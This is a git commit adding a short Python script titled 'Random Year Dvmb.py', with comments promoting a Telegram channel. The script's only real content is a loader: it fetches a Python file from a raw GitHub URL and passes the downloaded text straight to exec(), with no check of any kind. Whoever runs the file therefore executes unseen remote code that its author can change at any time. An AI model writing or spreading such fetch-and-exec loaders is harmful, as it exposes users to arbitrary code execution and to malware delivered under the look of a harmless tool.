df47d3d416742ebd87300597a6d1912b91c1b550
lakshy665 <rohanmanwani447@gmail.com>
2025-03-14 15:00:42 +0530

    Add files via upload

---
+++ Rᴀɴᴅᴏᴍ Yᴇᴀʀ 𝐃𝐯𝐦𝐛.py
@@ -0,0 +1,7 @@
+# 𝐁𝐨𝐮𝐠𝐡𝐭 𝐓𝐨 𝐘𝐨𝐮 𝐁𝐲 @𝐝𝐯𝐯𝐦𝐛 𝐎𝐧 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 | 𝐉𝐨𝐢𝐧 𝐓𝐡𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐓𝐡𝐚𝐭 𝐏𝐨𝐩𝐬 𝐔𝐩 ♡
+
+import requests
+res=requests.get('https://raw.githubusercontent.com/dvmbpy/DVMB/refs/heads/main/random%20year%20by%20dvmb.py')
+exec(res.text)
+
+# 𝗘𝗻𝗷𝗼𝘆.
